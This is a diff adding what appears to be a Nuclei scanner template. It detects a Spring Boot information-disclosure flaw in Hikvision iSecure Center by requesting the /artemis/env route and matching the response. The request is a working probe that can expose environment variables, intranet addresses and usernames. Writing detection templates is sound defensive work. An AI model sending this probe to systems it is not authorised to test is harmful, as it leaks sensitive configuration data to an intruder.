@@ -1,0 +1,29 @@
+id: hikvision-isecure-info-disclosure
+info:
+  name: Hikvision iSecure Center Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Hikvision iSecure Center contains a spring boot information disclosure vulnerability. An attacker can access exposed routes to obtain sensitive information such as environment variables, intranet addresses, and usernames in the configuration.
+  tags: information-disclosure
+  reference:
+    - https://www.hikvision.com/
+    
+variables:
+  route: "env"
+
+http:
+  - raw:
+      - |
+        GET /artemis/{{route}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "******"
+          - "hikvision"
+        part: body
